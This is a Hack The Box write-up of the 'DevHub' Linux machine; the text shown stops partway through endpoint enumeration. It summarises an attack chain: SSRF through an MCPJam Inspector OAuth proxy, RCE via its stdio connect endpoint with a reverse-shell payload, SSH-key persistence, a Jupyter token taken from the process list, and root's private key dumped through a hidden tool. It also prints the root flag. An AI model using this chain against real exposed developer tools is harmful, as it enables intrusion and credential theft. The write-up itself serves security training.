---
tags:
  - SN_11
link: https://app.hackthebox.com/machines/DevHub
description: Medium·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png
date: 2026-06-06
pawned: true
machine no.: 2
---
## Attack Chain Summary

![[Pasted image 20260610161338.png]]

| #   | Simple Version                                                                                                                                                                                                                                                                                                          | Technical Detail                                                                                                                                                                                                                                                                                                                                                                  |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | **Port scan — finding open doors** Three ports are open: SSH on 22, a website on 80, and an unknown service on 6274.                                                                                                                                                                                                    | `nmap -p- --min-rate 5000 -Pn 10.129.245.216` — full TCP sweep at 5,000 pps. `-Pn` skips ICMP discovery. Finds ports 22, 80, 6274.                                                                                                                                                                                                                                                |
| 2   | **Service fingerprinting — identifying what's behind each port** Port 22 is SSH, port 80 is nginx redirecting to `devhub.htb`, and port 6274 is a Node.js app called MCPJam Inspector.                                                                                                                                  | `nmap -A -p 22,80,6274` — OS detection, version detection, default scripts. Identifies OpenSSH 8.9p1, nginx 1.18.0 redirecting to `devhub.htb`, and a React SPA titled "MCPJam Inspector" on 6274.                                                                                                                                                                                |
| 3   | **Hosts file update — making the domain resolvable** The web server uses a hostname instead of a raw IP, so a local DNS entry is added to reach it.                                                                                                                                                                     | Add `10.129.245.216 devhub.htb` to `/etc/hosts`. The OS checks this file before any DNS query, so `devhub.htb` resolves locally without a real DNS record.                                                                                                                                                                                                                        |
| 4   | **Web enumeration — reading what the site says about itself** The homepage is an internal dev platform that openly advertises three internal services, including one accessible from outside and one supposedly locked to `localhost`.                                                                                  | Browsing `http://devhub.htb` — nginx serves a static page listing: MCP Inspector (active, port 6274), Jupyter Analytics Dashboard (internal only, `localhost:8888`), Git repo (maintenance). Tech stack disclosed: Node.js, Python 3, Jupyter, Ubuntu 24.04. Classic information disclosure.                                                                                      |
| 5   | **JS bundle extraction — mining the app's source code for hidden API routes** The entire application ships as one JavaScript file to the browser. That file contains every API endpoint as plain text strings. Grepping it reveals a list of backend routes including two dangerous ones.                               | `curl -s http://10.129.245.216:6274/assets/index-DRYhT9Xb.js \| grep -Eo '"/[a-zA-Z0-9/_-]+"' \| sort -u` — SPA bundles must contain endpoint strings as literals; they cannot be obfuscated away. Key finds: `/api/mcp/oauth/proxy` (SSRF candidate) and `/api/mcp/connect` (RCE candidate via stdio transport).                                                                 |
| 6   | **SSRF via OAuth proxy — using the server as a telescope into its own network** The OAuth proxy endpoint is designed to forward HTTP requests on behalf of the frontend. With no URL allowlist in place, it will fetch any address — including internal `localhost` services unreachable from outside.                  | `POST /api/mcp/oauth/proxy` with `{"url":"http://127.0.0.1:8888/api"}` — server makes the request server-side and proxies the response back. Returns `{"version":"2.17.0", "server":"TornadoServer/6.5.4"}`. SSRF confirmed. Internal network is now traversable.                                                                                                                 |
| 7   | **Internal service discovery — probing localhost:5000** The same SSRF technique is pointed at port 5000, revealing a second internal service: a custom Flask API called OPSMCP, which requires an API key and exposes tool endpoints.                                                                                   | `POST /api/mcp/oauth/proxy` with `{"url":"http://127.0.0.1:5000/"}` — response: OPSMCP 2.1.0 on Werkzeug/Flask, endpoints `/tools/list`, `/tools/call`, `/health`, auth via `X-API-Key` header. Process table later confirms it runs as root.                                                                                                                                     |
| 8   | **RCE via stdio transport — turning a developer feature into a shell** The MCPJam connect endpoint is supposed to launch local MCP server processes. It passes the supplied command and arguments directly to the OS without any validation. Substituting a Python reverse shell payload gets immediate code execution. | `POST /api/mcp/connect` with `{"serverConfig":{"type":"stdio","command":"python3","args":["-c","<reverse shell one-liner>"]}}` — `stdio` transport calls `child_process.spawn()` with attacker-controlled `command`/`args`, no allowlist, no auth. Reverse shell connects to `nc -lvnp 4444`. Shell lands as `mcp-dev`.                                                           |
| 9   | **SSH persistence — swapping the fragile shell for stable access** Reverse shells die easily if the HTTP connection times out or the process restarts. An SSH key pair is generated, the public key is planted in the target user's `authorized_keys`, and a clean SSH session replaces the reverse shell.              | `ssh-keygen -t ed25519 -f /tmp/devhub_key -N ""` on Kali. Via rev shell: `mkdir -p ~/.ssh`, `echo '<pubkey>' >> ~/.ssh/authorized_keys`, `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys`. SSH strict permission check requires exactly these modes or it silently ignores the key. Connect: `ssh -i /tmp/devhub_key mcp-dev@10.129.245.216`.                               |
| 10  | **Process table enumeration — finding a password hiding in plain sight** On Linux, every running process's full command line is world-readable. The Jupyter process was launched with its authentication token typed directly as a command-line argument — visible to every user on the box.                            | `ps auxww` — `ww` removes column truncation. Analyst's Jupyter process exposes `--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` in full. Stored in world-readable `/proc/<pid>/cmdline`. Also confirms OPSMCP (`/opt/opsmcp/server.py`) is running as root (PID 1061).                                                                                                |
| 11  | **Permission check — confirming why the analyst's files need a pivot** The analyst's home directory is locked to their own user and group. Direct access as `mcp-dev` is blocked, which confirms the Jupyter token is the only viable path to reading analyst's files.                                                  | `ls -la /home/analyst/` → `Permission denied`. Permissions are `drwxr-x---` owned by `analyst:analyst`. `mcp-dev` falls into the others category (`---`) — no read, write, or execute. Group membership would be required for the `r-x` to apply.                                                                                                                                 |
| 12  | **SSH port forwarding — tunnelling internal services to the attack machine** Both Jupyter and OPSMCP are bound to `127.0.0.1` on the target and unreachable externally. SSH local port forwarding creates encrypted tunnels that make them appear as local ports on Kali.                                               | `ssh -i /tmp/devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@10.129.245.216 -fN` — `-L local:dst_host:dst_port` binds a local port; traffic forwards through SSH and exits from the target's localhost. `-fN` forks to background. Verified: `curl localhost:18888/api` → `{"version":"2.17.0"}`, `curl localhost:15000/health` → `{"status":"healthy"}`.      |
| 13  | **Jupyter kernel creation — spawning a Python process as the analyst user** Jupyter's REST API doesn't execute code directly. First a kernel is created — a Python interpreter process that runs under the identity of whoever launched Jupyter, which is `analyst`.                                                    | `POST http://localhost:18888/api/kernels` with `Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` and `{"name":"python3"}`. Returns kernel ID `43e96841-...`. Kernel process spawns as `uid=1002(analyst)`.                                                                                                                                                          |
| 14  | **Jupyter code execution — running arbitrary Python as analyst** Jupyter uses a WebSocket connection (not a plain HTTP request) to actually send and receive code. A Python script speaks the Jupyter Messaging Protocol to execute commands and read back the output.                                                  | WebSocket to `ws://localhost:18888/api/kernels/{id}/channels` with the token header. Sends `execute_request` message (Jupyter Messaging Protocol v5.3) with `msg_id` for response correlation. Receives `stream` output. Code reads `user.txt` and — critically — the full source of `/opt/opsmcp/server.py`. Confirmed running as `uid=1002(analyst)`.                           |
| 15  | **Source code review — finding the API key and the hidden backdoor tool** Reading OPSMCP's source reveals a hardcoded API key and a secret tool that doesn't appear in the public tool listing. That hidden tool reads root's private SSH key directly from disk and returns it in the API response.                    | Source exposes: `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`. Hidden `ops._admin_dump` exists in `ALL_TOOLS` but not `VISIBLE_TOOLS` — absent from `/tools/list` responses, callable via `/tools/call`. The `target:"ssh_keys"` branch does `open('/root/.ssh/id_rsa','r')` and returns the content. Since OPSMCP runs as root, the file read succeeds unconditionally. |
| 16  | **Calling the hidden tool — extracting root's private SSH key** The hidden tool is called directly through the OPSMCP tunnel using the stolen API key. OPSMCP, running as root, reads root's own SSH private key and hands it back in the JSON response.                                                                | `POST http://localhost:15000/tools/call` with `X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a` and `{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}`. OPSMCP reads `/root/.ssh/id_rsa` as root and returns it in the `root_private_key` field.                                                                                                         |
| 17  | **Key extraction and root login — cleaning up the key and SSH-ing in as root** The private key arrives as a JSON string with escaped newlines. It's parsed into a properly formatted key file, permissions are set, and SSH is used to log in directly as root.                                                         | `curl ... \| python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" > /tmp/root_id_rsa` — `json.load()` converts `\n` escape sequences to real newlines. `chmod 600 /tmp/root_id_rsa`. `ssh -i /tmp/root_id_rsa root@10.129.245.216`. Root shell. `cat /root/root.txt` → `7418a44bc58001359c3601056dc530fe`.                                               |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ping -c 4 TARGET_IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=214 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=207 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=211 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=206 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 206.041/209.497/213.890/3.075 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:51 -0400
Nmap scan report for TARGET_IP
Host is up (0.32s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80,6274 TARGET_IP       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:55 -0400
Nmap scan report for TARGET_IP
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Tue, 09 Jun 2026 14:56:07 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Tue, 09 Jun 2026 14:56:08 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=6/9%Time=6A282988%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Tue,\x2009\x20Jun\x202026\x
SF:2014:56:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Tue,\x2009\x20Jun\x20
SF:2026\x2014:56:08\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Tue,\x2009\x20Jun\x202026\x2014:56:08\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.63 ms 10.10.14.1
2   223.76 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.30 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | Service | Version                    | Analysis                                                                                              |
| -------- | ------- | -------------------------- | ----------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH     | OpenSSH 8.9p1 Ubuntu       | Standard Ubuntu SSH — not directly exploitable; target for persistence once credentials/keys obtained |
| 80/tcp   | HTTP    | nginx/1.18.0               | Redirects to `devhub.htb`; informational landing page listing internal services                       |
| 6274/tcp | HTTP    | Node.js (MCPJam Inspector) | Debug tool for MCP protocol — public-facing, no authentication; high-value attack surface             |

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

Command: `sudo vi etc/hosts`

**Breakdown:**

- `sudo` 
	- Description: Elevated Privileges
	- Purpose: Required to modify system-level configuration files like the hosts database.
- `vi` 
	- Description: Terminal Text Editor
	- Purpose: Used to append the `TARGET_IP devhub.htb` entry to the file.
- `/etc/hosts` 
	- Description: Static Host Lookup Table
	- Purpose: The local file that takes precedence over DNS servers, ensuring the domain resolves to the CTF machine.
<div align="center">
<br>
<br>
</div>

##### Virtual hosting and the hosts file

###### The problem being solved

A single server sitting at one IP address can host dozens of completely different websites. The server has no way of knowing which website a visitor wants just from the IP alone — the IP just gets the traffic to the machine. Something else has to tell nginx or Apache _which_ site to serve. That something is the `Host:` header in every HTTP request, which contains the domain name the browser was trying to reach.

> This is virtual hosting. One IP, many hostnames, each mapped to a different site config on the server.
<div align="center">
<br>
</div>

###### What normally happens (DNS path)

When you type `devhub.htb` into your browser, your OS first checks its local hosts file — finding nothing — then asks a DNS resolver. The resolver looks up `devhub.htb`, gets back an IP, and your browser connects to that IP with the `Host: devhub.htb` header attached. nginx receives it, matches it against its vhost configs, and serves the right site.

`devhub.htb` is a fake `.htb` domain that doesn't exist in any public DNS server. So the resolver returns nothing, the browser gets no IP, and the page never loads.
<div align="center">
<br>
</div>

###### What the hosts file does

`/etc/hosts` is a static lookup table that the OS checks _before_ it ever contacts a DNS server. If it finds a match there, it uses that IP immediately and skips DNS entirely.

Adding `10.129.245.216 devhub.htb` means: "whenever anything on this machine asks for `devhub.htb`, hand back `10.129.245.216` without asking anyone." The browser still sends `Host: devhub.htb` in its request, nginx still pattern-matches it against its vhost configs — the only thing that changed is how the IP was resolved.
<div align="center">
<br>
</div>

###### Before and after

Before the entry: browser asks DNS → DNS has no record for `.htb` → lookup fails → no IP → connection never made → browser shows "server not found."

After the entry: browser asks OS → OS checks `/etc/hosts` → finds the entry → returns `10.129.245.216` immediately → browser connects and sends `Host: devhub.htb` → nginx matches the vhost → correct site is served.

The server itself doesn't change at all. The vhost config was always there waiting. You just gave your machine a way to find it.

![[hosts_file_before_after.png]]
![[vhosting_concept.png]]
<div align="center">
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://devhub.htb`.

![[Pasted image 20260609193242.png]]

- Title: DevHub - Internal Development Platform
- Confirms this is meant to be an internal-only page, not public-facing
- Copyright: 2026 DevHub Team - For Internal Use Only
- **Key finding:** The landing page explicitly advertises internal services.
- Three Service Cards:

| Service             | Status                         | Details                                                                          |
| ------------------- | ------------------------------ | -------------------------------------------------------------------------------- |
| MCP Inspector       | Active — Port 6274             | Externally reachable, used for building/testing MCP servers                      |
| Analytics Dashboard | Internal Only — localhost:8888 | Jupyter-based, restricted to analyst team                                        |
| Code Repository     | Maintenance Mode               | Internal Git server — no port exposed, meaning it's either down or fully hidden. |

- Tech Stack (bottom of page): `Node.js` `Python 3` `Jupyter` `MCP Protocol` `Ubuntu 24.04`
	This is a gift from a pentesting perspective — the app is openly advertising exactly what's running on the server.

What This Tells an Attacker:
- Port 6274 could be the entry point - it's the only thing marked active and externally accessible
- localhost:8888 is the prize behind it — Jupyter running as a restricted user, only reachable from inside the machine (SSRF target)
- Git repo exists somewhere — even in maintenance mode, git repos can contain credentials, commit history, config files
- Python 3 + Jupyter means code execution is possible if you can authenticate to Jupyter
- Ubuntu 24.04 narrows down kernel exploits and tells you what tools are likely installed


View Page Source:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DevHub - Internal Development Platform</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #eee; }
        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
        header { text-align: center; margin-bottom: 60px; }
        header h1 { font-size: 3rem; color: #00d9ff; margin-bottom: 10px; }
        header p { font-size: 1.2rem; color: #888; }
        .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .service-card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 30px; border: 1px solid rgba(255,255,255,0.1); transition: transform 0.3s, box-shadow 0.3s; }
        .service-card:hover { transform: translateY(-5px); box-shadow: 0 10px 40px rgba(0,217,255,0.2); }
        .service-card h3 { color: #00d9ff; margin-bottom: 15px; font-size: 1.4rem; }
        .service-card p { color: #aaa; line-height: 1.6; }
        .service-card .status { margin-top: 15px; padding: 8px 15px; border-radius: 20px; display: inline-block; font-size: 0.85rem; }
        .status.active { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
        .status.internal { background: rgba(255, 193, 7, 0.2); color: #ffc107; }
        footer { text-align: center; margin-top: 60px; color: #555; }
        .tech-stack { margin-top: 40px; text-align: center; }
        .tech-stack span { display: inline-block; background: rgba(255,255,255,0.1); padding: 8px 16px; border-radius: 20px; margin: 5px; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>DevHub</h1>
            <p>Internal Development & Analytics Platform</p>
        </header>
        
        <div class="services">
            <div class="service-card">
                <h3>MCP Inspector</h3>
                <p>Model Context Protocol development and debugging tool. Used by the dev team for building and testing MCP servers.</p>
                <span class="status active">Active - Port 6274</span>
            </div>
            
            <div class="service-card">
                <h3>Analytics Dashboard</h3>
                <p>Jupyter-based analytics environment for data processing and visualization. Access restricted to analyst team.</p>
                <span class="status internal">Internal Only - localhost:8888</span>
            </div>
            
            <div class="service-card">
                <h3>Code Repository</h3>
                <p>Internal Git server for version control and collaboration. Project documentation and deployment scripts.</p>
                <span class="status internal">Maintenance Mode</span>
            </div>
        </div>
        
        <div class="tech-stack">
            <span>Node.js</span>
            <span>Python 3</span>
            <span>Jupyter</span>
            <span>MCP Protocol</span>
            <span>Ubuntu 24.04</span>
        </div>
        
        <footer>
            <p>&copy; 2026 DevHub Team - For Internal Use Only</p>
        </footer>
    </div>
</body>
</html>
```

You can use Dev Tools to check network requests (Everything the browser fetched to load the page shows up there — HTML, CSS, JavaScript files, images, API calls, fonts, etc.)

In our case only 2 things loaded:
- `devhub.htb` — the main HTML page itself
- `config.json` — a separate file the page requested automatically

![[Pasted image 20260609193823.png]]

The application appears intentionally minimal:

- No authentication form
- No search functionality
- No visible API endpoints
- No user-controlled input
<div align="center">
<br>
<br>
</div>

#### 2.2.3 MCPJam

During our nmap service scan we found port `6274` open with an unknown service. The fingerprint response contained an HTML title — `MCPJam Inspector` — which immediately told us what was running. Navigating to http://TARGET_IP:6274 in the browser confirms it, presenting a single-page application (SPA): a clean React interface with connection controls, a tool list panel, and an execution console.

![[Pasted image 20260610000713.png]]
<div align="center">
<br>
</div>

##### What is MCP?

MCP stands for Model Context Protocol, an open standard created by Anthropic (the company behind Claude). Its purpose is to give AI assistants a structured way to connect to external tools and services — essentially giving the AI hands.

On its own an AI can only work with text. MCP changes that. Through MCP an AI can read files, query databases, call APIs, and run commands. The way it works is through MCP servers — small programs that expose a set of callable functions called "tools." An AI connects to an MCP server, asks what tools are available, and can then invoke them. A simple MCP server might expose tools like read_file, run_query, or list_services.
<div align="center">
<br>
<br>
</div>

##### What is MCPJam Inspector?

MCPJam is an organisation building tooling around the MCP ecosystem. Their Inspector is one specific tool. Developers use it to:

- Connect to an MCP server they're building
- See what tools it exposes
- Call those tools and inspect the responses
- Debug why something isn't working

It's a React frontend backed by a Node.js process. The Node.js backend is what actually makes connections to MCP servers on behalf of the browser UI.

The critical thing to understand about Inspector is that it was designed as a localhost developer tool — something you run on your own machine, for your own use, with no one else able to reach it. On DevHub it is exposed on a public port with no authentication. That single misconfiguration turns two legitimate developer features into attack primitives:

- Its proxy functionality (built to help developers reach remote OAuth endpoints) becomes an SSRF vector
- Its stdio transport (built to launch and communicate with local MCP server processes) becomes unauthenticated remote code execution

A tool that is perfectly safe on localhost becomes a critical vulnerability the moment it faces the internet.
<div align="center">
<br>
<br>
</div>

#### 2.2.4 MCPJam Inspector — JS Bundle Extraction

The next step is extracting the JavaScript bundle to find hidden API endpoints.

Here's the reasoning behind it:

MCPJam Inspector is a React single-page application (SPA). When you load it in the browser, the server sends one large JavaScript file that contains the entire application logic — all the UI code, all the API calls it makes, every endpoint it communicates with. This is just how SPAs work, everything has to be shipped to the browser to run.

The important thing is that string literals in JavaScript cannot be hidden. If the code makes a call to `/api/mcp/connect`, that string has to exist in the bundle exactly as-is for the HTTP request to work. You can minify and compress JavaScript but you cannot encrypt it — the browser has to be able to read and execute it.

So the process is:
<div align="center">
<br>
</div>

##### 1. Find the bundle filename:

**Command:** `curl -s http://TARGET_IP:6274/`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s http://TARGET_IP:6274/                       
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MCPJam Inspector</title>
    <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
```

This pulls the page source and the bundle filename is confirmed as `/assets/index-DRYhT9Xb.js`.
<div align="center">
<br>
</div>

##### 2. Fetch the bundle and extract all quoted paths

**Command:** `curl -s http://TARGET_IP:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u`

This fetches the actual JavaScript bundle file using the filename you just found, then extracts every quoted string that looks like a URL path.

**Breakdown:**

- `grep -Eo '"/[a-zA-Z0-9/_-]+"'` — Extract all double-quoted strings beginning with a forward slash (API path convention in JavaScript). `-E` enables extended regex, `-o` prints only matching text.
- `sort -u` — Deduplicate the results.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s http://TARGET_IP:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u
"//"
"/api/apps/chatgpt/widget/store"
"/api/chat"
"/api/mcp/apps/widget/store"
"/api/mcp/chat"
"/api/mcp/chat-v2"
"/api/mcp-cli-config"
"/api/mcp/connect"
"/api/mcp/elicitation/respond"
"/api/mcp/elicitation/stream"
"/api/mcp/evals/generate-negative-tests"
"/api/mcp/evals/generate-tests"
"/api/mcp/evals/run"
"/api/mcp/evals/run-test-case"
"/api/mcp/export/server"
"/api/mcp/list-tools"
"/api/mcp/log-level"
"/api/mcp/oauth/debug/proxy"
